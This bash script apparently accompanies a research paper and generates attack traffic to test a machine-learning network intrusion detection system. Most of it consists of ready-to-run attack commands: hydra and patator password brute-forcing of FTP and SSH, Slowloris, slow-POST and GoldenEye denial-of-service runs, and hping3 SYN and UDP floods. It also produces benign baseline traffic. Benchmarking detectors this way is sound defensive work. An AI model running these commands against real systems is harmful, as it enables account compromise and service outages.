#!/bin/bash
# Attack Evaluation Suite for MIPS-ML NIDS
# Paper Reference: Section V, Table II

set -e

# Configuration
TARGET_IP="${TARGET_IP:-192.168.1.1}"
DURATION="${DURATION:-60}"  # seconds per attack
LOG_DIR="./logs/$(date +%Y%m%d-%H%M%S)"

mkdir -p "$LOG_DIR"

echo "=== MIPS-ML NIDS Attack Evaluation ==="
echo "Target: $TARGET_IP"
echo "Duration per attack: ${DURATION}s"
echo "Logs: $LOG_DIR"
echo ""

# Check tools
check_tool() {
    if ! command -v "$1" &> /dev/null; then
        echo "Warning: $1 not found, skipping related tests"
        return 1
    fi
    return 0
}

#######################################
# 1. Brute-Force Attacks (FTP-Patator, SSH-Patator)
#######################################
run_bruteforce_tests() {
    echo "[1/3] Running Brute-Force Attack Tests..."

    # FTP Brute-force using hydra
    if check_tool hydra; then
        echo "  -> FTP Brute-force (hydra)..."
        timeout $DURATION hydra -l admin -P /usr/share/wordlists/rockyou.txt \
            ftp://$TARGET_IP -t 4 -w 1 2>&1 | tee "$LOG_DIR/ftp_bruteforce.log" || true
    fi

    # SSH Brute-force
    if check_tool hydra; then
        echo "  -> SSH Brute-force (hydra)..."
        timeout $DURATION hydra -l root -P /usr/share/wordlists/rockyou.txt \
            ssh://$TARGET_IP -t 4 -w 1 2>&1 | tee "$LOG_DIR/ssh_bruteforce.log" || true
    fi

    # Alternative: patator (if available)
    if check_tool patator; then
        echo "  -> FTP Brute-force (patator)..."
        timeout $DURATION patator ftp_login host=$TARGET_IP user=admin \
            password=FILE0 0=/usr/share/wordlists/rockyou.txt \
            2>&1 | tee "$LOG_DIR/ftp_patator.log" || true
    fi

    echo "  Brute-force tests completed."
}

#######################################
# 2. DoS Attacks (Slowhttptest, GoldenEye)
#######################################
run_dos_tests() {
    echo "[2/3] Running DoS Attack Tests..."

    # Slowloris attack
    if check_tool slowhttptest; then
        echo "  -> Slowloris (slowhttptest)..."
        timeout $DURATION slowhttptest -c 500 -H -g -o "$LOG_DIR/slowloris" \
            -i 10 -r 200 -t GET -u http://$TARGET_IP/ -x 24 -p 3 \
            2>&1 | tee "$LOG_DIR/slowloris.log" || true
    fi

    # Slow POST attack
    if check_tool slowhttptest; then
        echo "  -> Slow POST (slowhttptest)..."
        timeout $DURATION slowhttptest -c 500 -B -g -o "$LOG_DIR/slowpost" \
            -i 10 -r 200 -t POST -u http://$TARGET_IP/ -x 24 -p 3 \
            2>&1 | tee "$LOG_DIR/slowpost.log" || true
    fi

    # GoldenEye HTTP DoS
    if check_tool goldeneye; then
        echo "  -> GoldenEye HTTP DoS..."
        timeout $DURATION goldeneye http://$TARGET_IP/ -w 50 -s 10 \
            2>&1 | tee "$LOG_DIR/goldeneye.log" || true
    fi

    echo "  DoS tests completed."
}

#######################################
# 3. DDoS Attacks (LOIC modes)
#######################################
run_ddos_tests() {
    echo "[3/3] Running DDoS Attack Tests..."

    # LOIC TCP mode (using hping3 as alternative)
    if check_tool hping3; then
        echo "  -> TCP Flood (hping3 - LOIC TCP equivalent)..."
        timeout $DURATION sudo hping3 -S --flood -V -p 80 $TARGET_IP \
            2>&1 | tee "$LOG_DIR/tcp_flood.log" || true
    fi

    # LOIC UDP mode
    if check_tool hping3; then
        echo "  -> UDP Flood (hping3 - LOIC UDP equivalent)..."
        timeout $DURATION sudo hping3 --udp --flood -V -p 53 $TARGET_IP \
            2>&1 | tee "$LOG_DIR/udp_flood.log" || true
    fi

    # HTTP Flood
    if check_tool ab; then
        echo "  -> HTTP Flood (Apache Bench)..."
        timeout $DURATION ab -n 100000 -c 100 http://$TARGET_IP/ \
            2>&1 | tee "$LOG_DIR/http_flood.log" || true
    fi

    echo "  DDoS tests completed."
}

#######################################
# 4. Benign Traffic Generation
#######################################
run_benign_traffic() {
    echo "[Baseline] Generating Benign Traffic..."

    # Video streaming simulation (large file download)
    if check_tool curl; then
        echo "  -> Simulating video streaming (large downloads)..."
        for i in {1..5}; do
            curl -s -o /dev/null "http://$TARGET_IP/large_file" &
        done
        sleep $DURATION
        pkill -f "curl.*$TARGET_IP" || true
    fi

    # Normal web browsing
    if check_tool wget; then
        echo "  -> Simulating web browsing..."
        timeout $DURATION wget -q -r -l 2 --spider "http://$TARGET_IP/" \
            2>&1 | tee "$LOG_DIR/benign_browsing.log" || true
    fi

    echo "  Benign traffic generation completed."
}

#######################################
# Main
#######################################
case "${1:-all}" in
    bruteforce)
        run_bruteforce_tests
        ;;
    dos)
        run_dos_tests
        ;;
    ddos)
        run_ddos_tests
        ;;
    benign)
        run_benign_traffic
        ;;
    all)
        run_benign_traffic
        run_bruteforce_tests
        run_dos_tests
        run_ddos_tests
        ;;
    *)
        echo "Usage: $0 {bruteforce|dos|ddos|benign|all}"
        exit 1
        ;;
esac

echo ""
echo "=== Evaluation Complete ==="
echo "Logs saved to: $LOG_DIR"